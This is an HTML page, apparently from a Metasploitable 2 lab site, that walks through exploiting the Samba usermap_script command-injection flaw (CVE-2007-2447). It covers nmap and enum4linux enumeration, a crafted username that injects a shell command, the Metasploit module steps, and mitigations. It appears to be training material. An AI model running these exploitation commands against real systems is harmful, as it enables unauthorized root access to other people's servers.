@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SMB — Remote Code Execution | Metasploitable 2 Lab</title>
+  <link rel="stylesheet" href="../assets/css/style.css" />
+</head>
+<body>
+
+<nav class="site-nav">
+  <div class="container nav-inner">
+    <a class="nav-brand" href="../index.html">
+      <div class="brand-icon">M2</div>
+      <div class="brand-text"><h1>Metasploitable 2</h1><p>Penetration Testing Lab</p></div>
+    </a>
+    <div class="nav-links">
+      <a class="nav-link" href="../index.html#overview">Overview</a>
+      <a class="nav-link" href="../index.html#scan">Nmap Scan</a>
+      <a class="nav-link" href="../index.html#modules">Modules</a>
+    </div>
+    <a class="nav-btn btn" href="../index.html#modules">All Modules</a>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="breadcrumb">
+    <a href="../index.html">Home</a><span>/</span>
+    <a href="../index.html#modules">Modules</a><span>/</span>
+    <span style="color:var(--text)">SMB</span>
+  </div>
+</div>
+
+<div class="module-hero">
+  <div class="container">
+    <div class="module-hero-top">
+      <div class="module-title-wrap">
+        <p class="section-label">Ports 139/445/tcp — Server Message Block</p>
+        <h2>SMB — Remote Code Execution via Usermap Script</h2>
+        <p class="sub-title">Exploiting Samba Username Map Script Vulnerability</p>
+        <div class="overview-pills">
+          <span class="pill">CVE: <strong>CVE-2007-2447</strong></span>
+          <span class="pill">Port: <strong>139/445/tcp</strong></span>
+          <span class="pill">Impact: <strong>Remote Shell</strong></span>
+          <span class="pill">Tool: <strong>Metasploit</strong></span>
+        </div>
+      </div>
+      <span class="badge badge-high" style="font-size:.85rem;padding:.4rem 1rem">High</span>
+    </div>
+    <div class="overview-box">
+      <div class="overview-box-grid">
+        <div><div class="ov-item-label">Service</div><div class="ov-item-value">Samba smbd 3.0.20</div></div>
+        <div><div class="ov-item-label">Attack Type</div><div class="ov-item-value">RCE via Username</div></div>
+        <div><div class="ov-item-label">MSF Module</div><div class="ov-item-value mono">exploit/multi/samba/usermap_script</div></div>
+        <div><div class="ov-item-label">Result</div><div class="ov-item-value" style="color:var(--red)">✓ Root Shell Obtained</div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="content-layout">
+    <main class="content-body">
+
+      <div class="step-section" id="service-overview">
+        <div class="step-label"><div class="step-num">01</div><h3>Vulnerability Overview</h3></div>
+        <p>Samba smbd 3.0.20 contains a vulnerability in its username map script feature that allows unauthenticated remote code execution. An attacker can craft a malicious username containing shell commands that get executed with root privileges.</p>
+        <div class="callout">
+          This is a classic RCE vulnerability in Samba. The username map script processes user input unsafely, allowing command injection.
+        </div>
+      </div>
+
+      <div class="step-section" id="enumeration">
+        <div class="step-label"><div class="step-num">02</div><h3>Service Detection</h3></div>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">nmap</span> <span class="kw">-sV -v -p 139,445</span> <span class="str">&lt;target-ip&gt;</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Nmap SMB Service Version Scan</span>
+          </div>
+          <img src="../SMB/Nmap_SMB_Service_Scan.png" alt="SMB Nmap" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="smb-enum">
+        <div class="step-label"><div class="step-num">03</div><h3>SMB Enumeration</h3></div>
+        <p>Use enum4linux to enumerate SMB shares and users:</p>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">enum4linux</span> <span class="kw">-a &lt;target-ip&gt;</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Enum4linux SMB Enumeration</span>
+          </div>
+          <img src="../SMB/SMB_Enumeration.png" alt="SMB Enumeration" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="exploit">
+        <div class="step-label"><div class="step-num">04</div><h3>Exploitation</h3></div>
+        <p>The vulnerability allows command execution via crafted username. Manual exploitation:</p>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">smbclient</span> <span class="kw">-L //&lt;target-ip&gt; -U 'root;id'</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">SMB Command Injection via Username</span>
+          </div>
+          <img src="../SMB/SMB_Command_Injection.png" alt="SMB Command Injection" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="metasploit">
+        <div class="step-label"><div class="step-num">05</div><h3>Automated Exploitation — Metasploit</h3></div>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">msfconsole</span>
+<span class="kw">use</span> <span class="pth">exploit/multi/samba/usermap_script</span>
+<span class="kw">set</span> RHOSTS <span class="str">&lt;target-ip&gt;</span>
+<span class="kw">run</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Metasploit Samba Usermap Script Exploit</span>
+          </div>
+          <img src="../SMB/SMB_Metasploit_Exploit.png" alt="SMB Metasploit" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="results">
+        <div class="step-label"><div class="step-num">06</div><h3>Results &amp; Impact</h3></div>
+        <div class="results-box">
+          <h4>Outcome</h4>
+          <ul>
+            <li>Successfully exploited username map script vulnerability</li>
+            <li>Obtained root shell via command injection</li>
+            <li>Full system access achieved</li>
+            <li>Enumerated SMB shares and users</li>
+          </ul>
+        </div>
+        <div class="mitigation-box">
+          <h4>Detection &amp; Mitigation (Blue Team)</h4>
+          <ul>
+            <li>Update Samba to patched version</li>
+            <li>Disable username map script feature</li>
+            <li>Restrict SMB access to trusted networks</li>
+            <li>Use firewall to block ports 139/445 externally</li>
+            <li>Monitor SMB logs for suspicious activity</li>
+          </ul>
+        </div>
+      </div>
+
+    </main>
+    <aside class="toc">
+      <div class="toc-title">On This Page</div>
+      <a href="#service-overview">Overview</a>
+      <a href="#enumeration">Detection</a>
+      <a href="#smb-enum">SMB Enum</a>
+      <a href="#exploit">Exploit</a>
+      <a href="#metasploit">Metasploit</a>
+      <a href="#results">Results</a>
+    </aside>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="container footer-inner">
+    <div class="footer-left">← <a href="../index.html#modules" style="color:var(--cyan)">Back to Modules</a></div>
+    <div class="footer-links"><a href="./http.html">← HTTP</a><a href="./mysql.html">MySQL →</a></div>
+  </div>
+</footer>
+<div id="lightbox" class="lightbox-overlay"><button class="lightbox-close">✕</button><img src="" alt="" /></div>
+<script src="../assets/js/app.js"></script>
+</body>
+</html></content>
+<parameter name="filePath">c:\Users\Digits\Documents\GitHub\metasploitable2-penetration-testing-lab\pages\smb.html
